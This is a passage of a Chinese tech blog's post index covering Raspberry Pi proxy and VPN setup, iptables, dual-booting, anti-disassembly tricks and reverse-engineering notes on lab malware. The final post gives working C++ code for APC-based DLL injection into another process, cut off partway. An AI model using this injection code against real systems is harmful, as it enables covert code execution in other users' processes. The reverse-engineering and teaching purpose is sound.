2>&1\n\n参考链接：\nhttps://blog.bluerain.io/p/SS-Redir-For-Router.html\n\n​\t","tags":["杂学"],"categories":["杂学"]},{"title":"树莓派搭建vpn服务器","url":"/2017/11/11/树莓派搭建vpn服务器/","content":"\n1.此篇是在前篇搭建树莓派透明代理的基础上完成的，\n\n2.树莓派尽量设置成静态ip，具体如下\n\n\tsudo vim /etc/dhcpcd.conf\n\t填写以下内容\n\t\n\tinterface eth0\n\t\n\tstatic ip_address=ip\n\t\n\tstatic routers=网关\n\t\n\tstatic domain_name_servers=223.5.5.5\n\n3.安装openvpn\n\n\tsudo apt-get install openvpn\n\n4.下载easy-rsa\n\n\n\tcd /etc/openvpn\n\twget --no-check-certificate https://github.com/OpenVPN/easy-rsa/releases/download/2.2.2/EasyRSA-2.2.2.tgz\n\ttar -xzvf EasyRSA-2.2.2.tgz\n\tmv EasyRSA-2.2.2 easy-rsa\n\n5.配置easy-rsa\n\n\tcd /etc/openvpn/easy-rsa\n\tvim vars    # 打开easy-rsa配置文件\n\t修改一下内容\n\texport EASY_RSA=\"/etc/openvpn/easy-rsa\"\n\texport KEY_SIZE=1024 #默认的2048太大，要运算很久\n\t加载配置\n\tsource ./vars\n\n6.生成ca密钥\n\n\t./clean-all      # 先清空所有密钥\n\t./build-ca       # 创建自己的证书\n\t所有内容直接回车就可以了。这时keys文件夹下会多了ca.crt,和ca.key文件\n\n7.生成服务器密钥\n\n\t./build-key-server servername # servername为你自己设置的服务器名字\n\t会出现很多让填写的地方，注意下面三个其他的默认就好\n\tCommon Name 常用名必须是你方才所设置的服务器名，默认设置如此。\n\tA challenge password? 网上说必须留空，我也照办了，不晓得为什么\n\tSign the certificate? [y/n] 必须填y\n\n8.生成客户端密钥\n\n\t./build-key-pass client1   # 命令中client1是客户端的名字\n\tEnter PEM pass phrase 这个要记住，这是客户端使用vpn时的密码，会让输入两次。\n\t这时keys下又会多出三个文件client1.csr client1.crt client.key\n\n9.生成dh\n\n\t./build-dh\n\t到此密钥生成部分就完成了。\n\n10.openvpn 服务器配置\t\n\n\t# 复制一个模板过来先\n\tcp /usr/share/doc/openvpn/examples/sample-config-files/server.conf /etc/openvpn/server.conf\n\tvim /etc/openvpn/server.conf\n\t下面是我的配置\n\t\n\tport 1194   #Openvpn服务使用的端口\n\tproto tcp   #使用udp协议传输\n\tdev tun     #使用隧道\n\t\n\tca /etc/openvpn/easy-rsa/keys/ca.crt        #ca公钥路径\n\tcert /etc/openvpn/easy-rsa/keys/server.crt  #服务器公钥路径\n\tkey /etc/openvpn/easy-rsa/keys/server.key   #服务器私钥路径\n\tdh /etc/openvpn/easy-rsa/keys/dh1024.pem    #dh\n\t\n\tserver 10.10.20.0 255.255.255.0   #客户端连接后，所在的子网段\n\t\n\tifconfig-pool-persist ipp.txt   #客户端使用固定的子网地址，这里可以不配置\n\t\n\tpush \"redirect-gateway def1 bypass-dhcp\"    #网关重定向，客户端的流量都会经由OpenvpnServer\n\t#配置DNS\n\tpush \"dhcp-option DNS 202.141.162.123\"\n\tpush \"dhcp-option DNS 202.38.93.153 \n\t\n\tclient-to-client\n\t\n\tduplicate-cn    #允许客户端的CommonName重复，因为我们填的都是默认值\n\t\n\tkeepalive 10 120\n\t\n\tcomp-lzo    #启动数据压缩\n\t\n\tuser nobody     #Openvpn进程运行时所属的用户，这里为了安全\n\tgroup nogroup   #Openvpn进程运行时所属的组，这里为了安全\n\t\n\tpersist-key     #一直保存key，避免权限问题导致不能再次读取\n\tpersist-tun     #一直保持隧道，原因同上\n\t\n\tstatus /etc/openvpn/easy-rsa/keys/openvpn-status.log   #Openvpn运行状态Log，就在Openvpn目录下，会自动生成\n\t\n\tlog openvpn.log             #Openvpn运行Log，也在Openvpn目录下，会自动生成\n\t\n\tverb 3                      #log的等级\n\n11.此时可以测试一下了\n\n\topenvpn server.conf\n\tservice openvpn restart\n\t不报错就是成功了\n\n12.客户端配置\n\n\tcp /usr/share/doc/openvpn/examples/sample-config-files/client.conf /etc/openvpn/clientconfig/client.conf\n\tvim /etc/openvpn/clientconfig/client.conf\n\t我的配置如下：\n\t# 里面注释也很详细，这里贴出我精简后的结果\n\tclient      #标明是客户端配置\n\tdev tun     #使用隧道\n\tproto tcp   #使用UDP\n\t\n\tremote 192.168.19.149 1194   #树莓派外网IP（使用动态域名绑定） + 端口\n\tcomp-lzo        \n\t\n\tca ca.crt       #ca公钥\n\tcert wxlnb.crt  #客户端公钥\n\tkey wxlnb.key   #客户端私钥\n\t\n\tverb 3  #log等级\n\n13.防火墙规则我就改了一点\n\t\n\n\tiptables -t nat -A PREROUTING -i tun0 -p tcp -j REDSOCKS\n\n14.测试\n\n\t在其他Windows机器上，下载openvpn 安装，然后把ca.crt,client.conf（就是刚刚那个client.conf）,client1.crt,client1.key复制到config 文件夹下。\n\n参考链接\n\t\n\n\t1.http://www.smartmcu.com/article-246-1.html\n\t2.http://blog.csdn.net/wxlguitar/article/details/51175872","tags":["杂学"],"categories":["杂学"]},{"title":"重装系统后hexo 博客恢复","url":"/2017/11/05/hexo 博客恢复/","content":"\n### 1.安装node.js和git\n\n 这个不用多说，直接下载安装就行了。\n\n### 2.配置 git 个人信息，生成新的 ssh 密钥：\n\ngit config --global user.name \"xxxxxx\"\ngit config --global user.email \"xxxxxx\"\nssh-keygen -t rsa -C \"xxxxxxxx(邮箱)\"\n\n### 3.添加公钥\n\n在用户文件夹.ssh 文件里面把公钥复制出来粘贴到github个人设置的ssh位置。\n\n### 4.安装hexo\n\n建议先\nnpm install cnpm -g --registry=[https://registry.npm.taobao.org](https://registry.npm.taobao.org)\n安装的时候 用cpm 代替npm\n这样的话npm 安装比较快而且不容易失败\ncnpm install hexo-cli -g\n\n### 5.删除博客文件夹文件，保留部分\n\n打开原来的博客文件夹,只需保留_config.yml，theme/，source/，scaffolds/，package.json，.gitignore 这些项目，删除其他的文件。\n\n### 6.git bush\n\n在本文件夹下git bush,运行cnpm install\n\n### 7.安装部署插件\n\nnpm install hexo-deployer-git --save\n\n### 8.测试\n\n此时就可以hexo g &amp;&amp; hexo d 测试是否成功了。","tags":["杂学"],"categories":["杂学"]},{"title":"对抗反汇编分析","url":"/2017/10/22/对抗反汇编分析/","content":"\n一、 样本基本信息\n\n样本来源：恶意代码实战中的Lab15-03.exe。\n\n二、分析过程\n\nIDA 打开发现在00401016处有标红，IDA识别出了一些异常，仔细分析发现，把0x40148c写到了ebp+4的位置，而这个位置刚好是main函数返回地址的位置，通过改写此处的内容让main返回的时候执行0x40148c位置处的代码。\n\n![xx1](https://i.imgur.com/vd4KEI6.png)\n\n由此可看出主函数应该是非常正常，不会看出有什么恶意的地方。分析0x40148c处的代码。你此处的代码在0x401496处，有明显标红，说明有反汇编异常，一般都是恶意代码作者故意制作的来影响反汇编的结果。此处是一个很明显的对抗反汇编，上一步是跳转到401497的位置，而这个位置是jmp 这条指令的中间，这显然是不可能的，在此处按d键，把代码转为数据显示，然后把401497后面的数据按c键再转回代码，注意对齐。然后把401496位置的数据改为nop,可以通过Edit->Patch Program->change word ,把E9改为90，然后按c转换为代码就可以了。效果如图\n\n![](https://i.imgur.com/Qtl0ZFP.png)\n\n继续往下看，发现有一个除零异常出现 ，\n\n![](https://i.imgur.com/ng6kIn0.png)\n\n显然恶意代码先把异常处理函数的地址存到FS寄存器，然后出发除零异常执行此处的函数。显此处显然异常处理函数的地址是0x4014c0，而0x4014c0位置处的IDA没有识别为代码。按c键来转换为代码，继续向下看，在0x4014D7位置处，又出现了一个与0x401496处的相似的异常，同样的方法进行处理，结果如图\n\n![](https://i.imgur.com/d8PyGdS.png)\n\n这个估计就是恶意代码真正要做的事情的代码了。继续向下看，有个URLDownloadToFileA函数，显然很恶意。下面还有个反汇编异常先处理了，先D后C，然后结果如下，\n\n![](https://i.imgur.com/0TKYBzh.png)\n\n到此整个代码就分析完了，主要是4014c0处是真正要关注的，下面分析这个位置的代码\n\n![](https://i.imgur.com/KPoVtCC.png)\n![](https://i.imgur.com/ue6meMj.png)\n\n主要关注标红的位置，此处看不出什么来，在OD中实际执行一下来看。\n\n直接在0x40148c处下断点，然后直接f9运行到此处，若看到一堆数据，右键分析->从模块中删除分析就可以了，改写相应位置的异常按照IDA那样，实验过程发现se处理程序的确是0x4014c0但是程序并没有跳到那个位置而是终止了，没搞明白，为了真正看到0x4014c0处的具体执行情况。我选择直接编辑汇编代码。写入jmp 0x4014c0,\n\n![](https://i.imgur.com/kijEK2T.png)\n\n发现在0x4014db处好像也是异常终止了，后改为\n\n![](https://i.imgur.com/yhPNUnh.png)\n\n正常了、\n然后在四个函数处下断点观察参数信息和返回信息，\n\n![](https://i.imgur.com/KK9LVGS.png)\n\n0x401534明显是一个解密函数，然后把网址和文件就解密出来，然后URLDownloadToFileA下载，winexec 执行下载的文件。","tags":["逆向"],"categories":["逆向"]},{"title":"iptables","url":"/2017/10/20/iptables/","content":"\n## 简介\n&emsp;&emsp;当主机收到一个数据包后，数据包先在内核空间中处理，若发现目的地址是自身，则传到用户空间中交给对应的应用程序处理，若发现目的不是自身，则会将包丢弃或进行转发。\n\n&emsp;&emsp;iptables实现防火墙功能的原理是：在数据包经过内核的过程中有五处关键地方，分别是PREROUTING、INPUT、OUTPUT、FORWARD、POSTROUTING，称为钩子函数，iptables这款用户空间的软件可以在这5处地方写规则，对经过的数据包进行处理，规则一般的定义为“如果数据包头符合这样的条件，就这样处理数据包”。\n\n&emsp;&emsp;iptables中定义有表，分别表示提供的功能，有filter表（实现包过滤）、nat表（实现网络地址转换）、mangle表（实现包修改）、raw表（实现数据跟踪），这些表具有一定的优先级：raw-->mangle-->nat-->filter\n\n![](https://i.imgur.com/Fl0nfg8.png)\n\n![](https://i.imgur.com/OHQyUMC.png)\n\n## 常用操作\n\n&emsp常用操作命令\t说明\n\n-A\t在指定链尾部添加规则\n\n-D\t删除匹配的规则\n\n-R\t替换匹配的规则\n\n-I\t在指定位置插入规则\n\n\t例：iptables -I INPUT 1 --dport 80 -j ACCEPT\n\t（将规则插入到filter表INPUT链中的第一位上）\n\n-L/S\t列出指定链或所有链的规则\n\n-F\t删除指定链或所有链的规则\n\n-N\t创建用户自定义链\n\n\t例：iptables -N allowed\n\n-X\t删除指定的用户自定义链\n\n-P\t为指定链设置默认规则策略，对自定义链不起作用\n\n\t例：iptables -P OUTPUT DROP\n\n-Z\t将指定链或所有链的计数器清零\n\n-E\t更改自定义链的名称\n\n\t例：iptables -E allowed disallowed\n\n-n\tip地址和端口号以数字方式显示\n\n\t例：iptables -Ln\n\n常见规则匹配器\t说明\n\n-p tcp|udp|icmp|all\t匹配协议，all会匹配所有协议\n\n-s addr[/mask]\t匹配源地址\n\n-d addr[/mask]\t匹配目标地址\n\n--sport port1[:port2]\t匹配源端口(可指定连续的端口）\n\n--dport port1[:port2]\t匹配目的端口(可指定连续的端口）\n\n-o interface\t匹配出口网卡，只适用FORWARD、POSTROUTING、OUTPUT。\n\n\t例：iptables -A FORWARD -o eth0\n\n-i interface\t匹配入口网卡，只使用PREROUTING、INPUT、FORWARD。\n\n--icmp-type \t匹配icmp类型（使用iptables -p icmp -h可查看可用的ICMP类型\n）\n\n--tcp-flags mask comp\t匹配TCP标记，mask表示检查范围，comp表示匹配mask中的哪些标记。\n\n\t例：iptables -A FORWARD -p tcp --tcp-flags ALL SYN，ACK -j ACCEPT\n\t（表示匹配SYN和ACK标记的数据包）\n\n目标动作\t说明\n\nACCEPT\t允许数据包通过\n\nDROP\t丢弃数据包\n\nREJECT\t丢弃数据包，并且将拒绝信息发送给发送方\n\nSNAT\t源地址转换（在nat表上）\n\n\t例：iptables -t nat -A POSTROUTING -d 192.168.0.102 -j SNAT --to 192.168.0.1 \n\nDNAT\t目标地址转换（在nat表上）\n\n\t例：iptables -t nat -A PREROUTING -d 202.202.202.2 -j DNAT --to-destination 192.168.0.102\n\nREDIRECT\t目标端口转换（在nat表上）\n\n\t例：iptables -t nat -D PREROUTING -p tcp --dport 8080 -i eth2.2 -j REDIRECT --to 80\n\nMARK\t将数据包打上标记\n\n\t例：iptables -t mangle -A PREROUTING -s 192.168.1.3 -j MARK --set-mark 60\n\n### 注意要点：\n\n    1、目标地址转换一般在PREROUTING链上操作\n\n    2、源地址转换一般在POSTROUTING链上操作\n\n\nstate：匹配指定的状态数据包\n\n\n参数\t说明\n\n--state value\tvalue可以为NEW、RELATED（有关联的）、ESTABLISHED、INVALID（未知连接）\n\n例子：\n\tiptables -A INPUT -m state --state NEW，ESTABLISHED -j ACCEPT\n\n## 常见iptables \n\n&emsp;&emsp;MASQUERADE：是动态分配ip时用的IP伪装：在nat表的POSTROUTING链加入一条规则:所有从ppp0口送出的包会被伪装（MASQUERADE）\n\n iptables -t nat -A POSTROUTING -o ppp0 -j MASQUERADE\n\n&emsp;&emsp;REDIRECT：重定向，这个在squid透明代理时肯定要用到它\n\n 所有从eth1进入的请求80和82端口的数据，被转发到80端口，由squid处理。\n\n iptables -t nat -A PREROUTING - -i eth1 -p tcp -m multiport --dports 80,82 -j REDIRECT --to-ports 80\n\n\n保存和恢复iptables规则\n\n使用iptables-save可以保存到特定文件中\n\n&emsp;&emsp;iptables-save >/etc/sysconfig/iptables_save\n\n使用iptables-restore可以恢复规则\n\n&emsp;&emsp;iptables-restore</etc/sysconfig/iptables_save\n","tags":["网络安全"],"categories":["网络安全"]},{"title":"双系统安装（win10+ubuntu）","url":"/2017/10/16/双系统安装/","content":"\n1.我选择的 是win10加ubuntu双系统。\n\n2.准备工作\n\n\t\t  U盘一个16g\n\t\t  win10系统\n\t\t  ubuntu系统\n\n3.备份好硬盘数据以后，空出一个分区，然后制作一个PE盘，然后进PE删除这个分区，使其处于未分配的空间状态，用于安装ubuntu ,然后安装win10，这个就不用多说了，大家都会。\n\n4.安装结束以后，用大白菜iso装机方式，把ubuntu系统直接写入U盘，然后U盘其启动即可进入装机状态。\n\n其他的跟一般装ubuntu一样，在分区那个位置，选择其他方式，选择手动分区，然后选择刚刚那个未分配空间，一般可以分4个分区。/boot 200M,swap分区视内存定,一般可以和内存一样大，然后剩下分/，15g-20g左右，剩下的可以全部给/home。引导驱动器选择/boot,然后继续安装正常方式来装就好了。\n\n4.此时两个系统都安好了，但是此时还是默认win10启动，此时最重要的来了，下载一个叫EasyBCD的软件，选择添加新条目，然后选择Linux，然后名称，驱动器选择/boot对应的就好了。此时重启你就会发现有两个候选操作系统了。\n\n![](https://i.imgur.com/prFcTXH.png)","tags":["杂学"],"categories":["杂学"]},{"title":"对抗反汇编","url":"/2017/10/16/对抗反汇编/","content":"\n##### 方法总结如下：\n\n##### 1、插入流氓字节，阻止真正的指令被反汇编\n\n线性反汇编和面向代码流的反汇编：\n\n线性反汇编是遍历一个代码段，一次一条指令的线性反汇编，不考虑代码流的控制指令。而面向代码流的反汇编是会检查每一条指令。然后建立反汇编的地址列表，然后这样的反汇编算法会更加先进，而不易出错。比如：\n\n\n\t\t.text:00401035                 jz      short near ptr loc_401037+1\n\t\t.text:00401037\n\t\t.text:00401037 loc_401037:                             ; CODE XREF: .text:00401035\u0018j\n\t\t.text:00401037                 call    near ptr 8B4C55C7h\n\n观察以上的汇编代码，你会发现jz跳转到了call 指令中间，这显然是不可能的，所以call指令一定是一个数据而不是代码，在此处按d键，然后再观察\n\n\n>     .text:00401035                 jz      short loc_401038\n>    .text:00401035 ; ---------------------------------------------------------------------------\n\t        .text:00401037                 db 0E8h\n\t    .text:00401038 ; ---------------------------------------------------------------------------\n\t    .text:00401038\n\t    .text:00401038 loc_401038:                             ; CODE XREF: .text:00401035\u0018j\n\t    .text:00401038                 mov     eax, [ebp+0Ch]\n\n这样显然很正确了，对于call 指令而言，如果后面四个字节跟的是地址，它对应的机器码是0xe8，此处显然是把数据0xe8当成了call指令，才会出现这样的问题。\n\n##### 2、固定条件的跳转指令\n\n\t                               xor     eax, eax\n\t.text:00401035                 jz      short loc_401038\n##### 3、函数指针问题 \n\n\t mov [ebp+var_4],offset sub_4011c0;\n\t call [ebp+var_4]\n\t可用IDA脚本语言IDC进行修正函数为AddCodeXref();\n##### 4、函数未识别的问题 \n\n可以按p键来强制把一段代码变成函数\n但是要把流氓字节nop,不然函数可能会出问题。用IDA自带的patch program来做。\n也可用脚本idapython  代码如下：\n\n\timport idaapi\n\tidaapi.CompileLine('static n_key(){ RunPythonStatement(\"nopIt()\");}')\n\tAddHotkey(\"Alt-N\",\"n_key\")\n\tdef nopIt():\n\t\tstart=ScreenEA()\n\t\tend=NextHead(start)\n\t\tfor ea in range(start,end):\n\t\t\tPatchByte(ea,0x90)\n\t\tJump(end)\n##### 5、异常触发\n\n\t  push offset sub_4014c0\n\t  push large dword ptr fs:0\n\t  mov large fs:0,esp\n\t  xor ecx,ecx\n\t  div ecx\n\n属于滥用结构化异常（SEH）来对抗反汇编，通过人为构造一些比如访问一个无效的内存区域，除0等来触发异常，\n\nSHE链是一个函数列表，处理线程的异常，列表中的函数要么处理异常，要么向下传递，如果传递到最后一个异常处理函数，就会被认为是一个不能处理的异常，弹出“an unhandled exception has occurred ”。\n\n查找SEH链，操作系统会检查FS寄存器，这个寄存器中包含一个段选择子，从概念上来讲，链表以栈的方式工作，第一个调用的是最后一个加入链表的记录。前面的例子就是把自己的异常处理加入到链表的头部，然后用除0来触发异常，进而执行自己的代码。","tags":["逆向"],"categories":["逆向"]},{"title":"恶意代码重定向","url":"/2017/10/16/恶意代码重定向/","content":"\n&emsp;1.首先用strings查看字符串，发现http://www.practicalmalwareanalysis.com/start.htm，User-Agent字样，以及C:\\autobat.exe，疑似编码用的字符串：\n\n\t/abcdefghijklmnopqrstuvwxyz0123456789:.以及CreateFile，CreateProcessA，\n\tInternetReadFile\n\tInternetCloseHandle\n\tInternetOpenUrlA\n\tInternetOpenA\n\tWININET.dll\n\tURLDownloadToCacheFileA \n&emsp;&emsp;显式调用高层API COM接口，以及Wininet 接口函数。\n![](https://i.imgur.com/qDJ4DI5.png)\n这些函数，这些都是重要信息需要关注的。\n\n&emsp;&emsp;2.IDA加载程序分析，首先是401457函数，调用了CreateFileA和ReadFile函数，具体分析发现是打开'C:\\autobat.exe',失败了调用函数，分析可知是把'http://www.practicalmalwareanalysis.com/start.htm',0写入文件C:\\autobat.exe，重命名该函数为write_url,然后再次调用401457函数，分析可得是把该网址读到缓冲区ipbuffer,命名该函数为read_url,返回值为1，然后接下来调用4011f3函数，首先是在szagent地址存放硬编码的头部信息，但是错误的多写了User-Agent：这样会导致实际得到的头部会出现User-Agent:User-Agent:的情况。然后下面是InternetOpenA和InternetOpenUrlA函数打开http://www.practicalmalwareanalysis.com/start.htm，打开成功后InternetReadFile读取页面信息， 首先搜索<no'字符串，然后调用401000函数，\n\n![](https://i.imgur.com/ht0pUfZ.png)\n\n&emsp;&emsp;进去分析发现是对<noscript标签的不规则比较，然后对判断是否后面会有http://www.practicalmalwareanalysis.com，然后找到“96”的位置结束，然后把v7地址存放的内容赋到a3地址。\n\n![](https://i.imgur.com/akX3WUw.png)\n\n&emsp;&emsp;函数401000成功返回1，然后4011f3也返回1，最后执行401684函数，函数有两个参数，一个是刚刚的a3，另一个是v6的地址。v6=1,打开401684函数进行分析，是现实strtok函数，把字符串分为两部分，分别赋给两变量，然后是个case语句，当发现首字母为d时，执行401565函数，分析401565函数，首先是401147函数初步分析发现是个解码函数，然后后面是URLDownloadToCacheFileA，CreateProcessA函数，是把下载的程序运行起来。首字母为n时，v6置1，首字母为s时，sleep特定的时间，首字母为r时，运行401651函数，进去函数进行分析，发现又是刚刚那个解码函数401147，然后再次调用write_url函数，由此可以知道应该是个url重定向。到此整个样本就已经分析结束了。","tags":["逆向"],"categories":["逆向"]},{"title":"树莓派透明代理","url":"/2017/10/16/树莓派透明代理/","content":"\n\n1.安装vim\n\n连网之后，首先安装vim,便于后面的配置文件的编写。\n\n \tsudo apt-get install vim\n\n2.静态ip  \n\n图形界面貌似会失败，建议在配置文件里改：\n\n\tsudo vim /etc/dhcpcd.conf\n\n填写以下内容\n\n\tinterface eth0\n\t\n\tstatic ip_address=ip\n\t\n\tstatic routers=网关\n\t\n\tstatic domain_name_servers=223.5.5.5\n\n3.配置路由转发：\n\n\tsudo vim  /etc/sysctl.conf\n\n设置：\n\n\n\tnet.ipv4.ip_forward=1\n\n4.ssh开机自启动\n\n&emsp;&emsp;ssh 连接树莓派还是很放方面的，不用每次都去接键盘之类的\n但是树莓派的ssh 默认是不自启动的，在/etc/rc.local中添加\n\n\tsudo /etc/init.d/ssh start (exit 之前)\n\n5.shadowssocks 安装\n\n建议pip 安装\n\n>sudo pip install  shadowsocks \n就可以了然后就是配置文件的编写\n\n>sudo mkdir /etc/shadowsocks \nsudo touch /etc/shadowsocks/shadowsocks.json\n\n添加以下内容\n\n\t{ \n\t    \"server\":\"127.0.0.1\",\n\t    \"server_port\":ss服务器端口,\n\t    \"local_address\":\"0.0.0.0\",\n\t    \"local_port\":1080,\n\t    \"password\":\"ss密码\",\n\t    \"timeout\":600,\n\t    \"method\":\"aes-256-cfb\"\n\t}\n6.redsocks安装\n\n\tgit clone git@github.com:darkk/redsocks.git（克隆失败可以在其他地方下载后传过来） \n\t\n\tsudo apt-get install libevent-dev \n\t\n\tcd redsocks\n\t\n\tmake\n\t\n在redsocks 文件夹中有redsocks.conf.example\n把它复制出来，重命名为 redsocks.conf \n我习惯放在/etc目录下即/etc/redsocks.conf\n然后编辑配置文件\n\t\n\tlocal_ip =0.0.0.0 ;\n\tlocal_port = 12345; 自己定义后面iptables要用\n\tip = 127.0.0.1;\n\tport = 1080;\n\n7.kcptun 加速器的安装\n\nKcptun的作用主要是配合SS用来做加速。\n\n下载地址\n\n >https://github.com/xtaci/kcptun/releases/latest\n\n选择kcptun-linux-arm 那一个下载解压\n >tar -zxf kcptun-linux-arm*.tar.gz\n选择适合你的树莓派的二进制文件我选择的是client_linux_arm7 。\n\n创建配置文件如下：\n\n\t{\n\t  \"localaddr\": \":8888\",\n\t  \"remoteaddr\": \"服务器ip:端口\",\n\t  \"key\": \"very fast\",\n\t  \"crypt\": \"aes-128\",\n\t  \"mode\": \"fast2\",\n\t  \"mtu\": 1400,\n\t  \"sndwnd\": 256,\n\t  \"rcvwnd\": 2048,\n\t  \"datashard\": 10,\n\t  \"parityshard\": 3,\n\t  \"dscp\": 46,\n\t  \"nocomp\": false\n\t}\n\n然后把client_linux_arm7放到/usr/local/bin 里面\n运行\n> sudo client_linux_arm7 -c 配置文件\n就可以了。\n\n8.iptabels \n\n\tsudo sslocal -c /etc/shadowsocks/shadowsocks.json & > /dev/null 2>&1 \n\tsudo redsocks -c /etc/redsocks/redsocks.conf & > /dev/null 2>&1 \n\tsudo iptables -t nat -N REDSOCKS \n\tsudo iptables -t nat -A REDSOCKS -d 0.0.0.0 -j RETURN \n\tsudo iptables -t nat -A REDSOCKS -d 127.0.0.0/8 -j RETURN \n\tsudo iptables -t nat -A REDSOCKS -d 192.168.0.0/16 -j RETURN \n\tsudo iptables -t nat -A REDSOCKS -d 10.0.0.0/16 -j RETURN \n\tsudo iptables -t nat -A REDSOCKS -d 服务器IP -j RETURN \n\tsudo iptables -t nat -A REDSOCKS -p tcp -j REDIRECT --to-ports 12345 \n\tsudo iptables -t nat -A OUTPUT -p tcp -j REDSOCKS \n\tsudo iptables -t nat -A PREROUTING -i eth0 -p tcp -j REDSOCKS\n\t\n9.此时你把局域网其他电脑设置成它还是不能上网，因为存在dns 问题通过安装dnsmasq来解决\n\n\tsudo apt-get install dnsmasq\n\n配置文件在 /etc/dnsmasq.conf\n编辑配置文件\n取消no-resolv前面的注释\n加入 \n\n\t\tserver=202.38.93.153 \n\t\tserver=202.141.162.123\n\n保存重启dnsmasq  \n\n\t\tsudo service dnsmasq restart\n\n此时不出意外的话应该是可以把局域网内的其他主机网关s设置成 树莓派的ip ,然后实现透明上网。\n建议dns 设置成\n\n\t\tserver=202.38.93.153 \n\t\tserver=202.141.162.123\n\n10 .善后工作\n把上述的配置加入启动项\n\n\t\tsudo /etc/init.d/ssh start\n\t\tsudo client_linux_arm7 -c /home/pi/Desktop/configus.txt  & > /dev/null 2>&1\n\t\tsudo sslocal -c /etc/shadowsocks-libev/ss.conf & > /dev/null 2>&1\n\t\tsudo redsocks -c /etc/redsocks.conf & > /dev/null 2>&1\n\t\tsudo service dnsmasq restart\n附加：\n热点配置\n安装hostapd \n\n\tsudo apt-get install hostapd\n\n配置文件/etc/hostapd/hostapd.conf \n\n\t\tinterface=wlan0 \n\t\thw_mode=g \n\t\tchannel=10 \n\t\tauth_algs=1 \n\t\twpa=2 \n\t\twpa_key_mgmt=WPA-PSK \n\t\twpa_pairwise=CCMP \n\t\trsn_pairwise=CCMP \n\t\twpa_passphrase=wifi密码 \n\t\tssid=wifi名字\n\ndnsmasq 配置文件/etc/dnsmasq.conf 中修改\n\n\t\tinterface=wlan0\n\t\tdhcp-range=10.0.0.2,10.0.0.255,255.255.255.0,12h\n\n在启动项中/etc/rc.local 增加：\n\t\t\n\t\tsudo ifconfig wlan0 down \n\t\tsudo ifconfig wlan0 10.0.0.1 netmask 255.255.255.0 up \n\t\tsudo rm -rf /dev/random \n\t\tsudo ln -s /dev/urandom /dev/random \n\t\tsudo service dnsmasq restart \n\t\tsudo hostapd -B /etc/hostapd/hostapd.conf & > /dev/null 2>&1\n\t\tsudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE \n\t\tsudo iptables -A FORWARD -i eth0 -o wlan0 -m state --state RELATED,ESTABLISHED -j ACCEPT sudo iptables -A FORWARD -i wlan0 -o eth0 -j ACCEPT\n\n以及在/etc/iptables 中增加\n\n\t\tsudo iptables -t nat -A PREROUTING -i wlan0 -p tcp -j REDSOCKS\n\n参考网址：\nhttp://fishedee.com/%E5%90%8E%E7%AB%AF/2016/11/30/%E6%A0%91%E8%8E%93%E6%B4%BE%E5%81%9A%E9%80%8F%E6%98%8E%E4%BB%A3%E7%90%86.html\n\nhttp://www.jianshu.com/p/05d32b4e8fc0\n\nhttp://blog.uiideas.com/2016/09/16/Kcptun%E4%BD%BF%E7%94%A8/\n\nhttps://story.tonylee.name/2016/03/31/yong-shu-mei-pai-da-zao-wu-xian-zhong-ji-ke-xue-shang-wang-lu-you-qi/\n","tags":["杂学"],"categories":["杂学"]},{"title":"dll注入之APC注入","url":"/2017/09/16/dll之APC注入/","content":"\nAPC注入的原理是利用当线程被唤醒时APC中的注册函数会被执行的机制，并以此去执行我们的DLL加载代码，进而完成DLL注入的目的，其具体流程如下：\n\n    1）当EXE里某个线程执行到SleepEx()或者WaitForSingleObjectEx()时，系统就会产生一个软中断（或者是Messagebox弹窗的时候不点OK的时候也能注入）。\n\n    2）当线程再次被唤醒时，此线程会首先执行APC队列中的被注册的函数。\n\n    3）利用QueueUserAPC()这个API可以在软中断时向线程的APC队列插入一个函数指针，如果我们插入的是Loadlibrary()执行函数的话，就能达到注入DLL的目的。\n程序如下:\n\n\t// TESTAPC2.cpp : 定义控制台应用程序的入口点。\n\t//\n\t\n\t#include \"stdafx.h\"\n\t#include <string>\n\t#include<windows.h>\n\t#include<shlwapi.h>\n\t#include<tlhelp32.h>\n\t#include<winternl.h>\n\t#pragma comment(lib,\"shlwapi.lib\")\n\t#pragma comment(lib,\"ntdll.lib\")\n\tusing namespace std;\n\t//根据进程名获取PID\n\tDWORD GetPidFormName(wstring wsProcessname)\n\t{\n\t\tHANDLE hSnaoshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);\n\t\tif (hSnaoshot == INVALID_HANDLE_VALUE)\n\t\t{\n\t\t\treturn false;\n\t\t}\n\t\tPROCESSENTRY32W pe = { sizeof(pe) };\n\t\tBOOL bok;\n\t\tfor (bok = Process32FirstW(hSnaoshot, &pe); bok; bok = Process32NextW(hSnaoshot,&pe))\n\t\t{\n\t\t\twstring wsNowProcName = pe.szExeFile;\n\t\t\tif (StrStrI(wsNowProcName.c_str(), wsProcessname.c_str()) != NULL)\n\t\t\t{\n\t\t\t\tCloseHandle(hSnaoshot);\n\t\t\t\treturn pe.th32ProcessID;\n\t\t\t}\n\t\t}\n\t\tCloseHandle(hSnaoshot);\n\t\treturn 0;\n\t}\n\t//dll 文件注入到进程wsProcessname\n\tBOOL Injection_APC(const wstring &wsProcessname, const WCHAR wcCacheInDllPath[])\n\t{\n\t\tDWORD dwProcessId = GetPidFormName(wsProcessname);\n\t\tHANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId);\n\t\tif (!hProcess)\n\t\t{\n\t\t\treturn FALSE;\n\t\t}\n\t\tPVOID lpData = VirtualAllocEx(hProcess, NULL, 1024, MEM_COMMIT, PAGE_EXECUTE_READWRITE);\n\t\tDWORD dwRet;\n\t\tif (lpData)\n\t\t{\n\t\t\t//在远程进程申请空间写入待注入dll 的路径\n\t\t\tWriteProcessMemory(hProcess, lpData, (LPVOID)wcCacheInDllPath,MAX_PATH, &dwRet);\n\t\t\tCloseHandle(hProcess);\n\t\t}\n\t\t//开始注入\n\t\tTHREADENTRY32 te = { sizeof(te) };\n\t\tHANDLE handleSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);//遍历系统中所有线程\n\t\tif (handleSnap == INVALID_HANDLE_VALUE)\n\t\t{\n\t\t\treturn false;\n\t\t}\n\t\tbool bstat = false;\n\t\tif (Thread32First(handleSnap, &te))\n\t\t{\n\t\t\tdo {\n\t\t\t\tif (te.th32OwnerProcessID == dwProcessId)\n\t\t\t\t{\n\t\t\t\t\tHANDLE handleThread = OpenThread(THREAD_ALL_ACCESS, FALSE, te.th32ThreadID);\n\t\t\t\t\tif (handleThread)\n\t\t\t\t\t{\n\t\t\t\t\t\tDWORD dwRet = 